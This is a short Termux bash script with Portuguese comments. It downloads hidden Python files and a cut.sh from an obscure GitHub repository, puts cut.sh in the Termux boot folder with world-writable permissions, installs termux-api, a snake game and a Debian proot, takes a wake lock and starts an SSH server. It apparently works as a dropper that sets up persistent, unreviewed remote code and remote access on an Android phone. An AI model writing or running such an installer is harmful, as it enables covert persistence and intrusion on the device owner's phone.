#!/bin/bash

# Baixa os arquivos .pit.py e .pit2.py
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit.py
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/.pit2.py

# Cria a estrutura de diretórios .termux/boot e entra no diretório
mkdir -p ~/.termux/boot
cd ~/.termux/boot

# Baixa o arquivo cut.sh e define as permissões
curl -O https://raw.githubusercontent.com/2o2kd/60undertrpb023/main/cut.sh
chmod 777 cut.sh

# Instala pacotes necessários
pkg install nsnake termux-api python proot-distro -y

# Instala a distribuição Debian
proot-distro install debian -y

# Ativa o wake lock e inicia o servidor SSH
termux-wake-lock
sshd
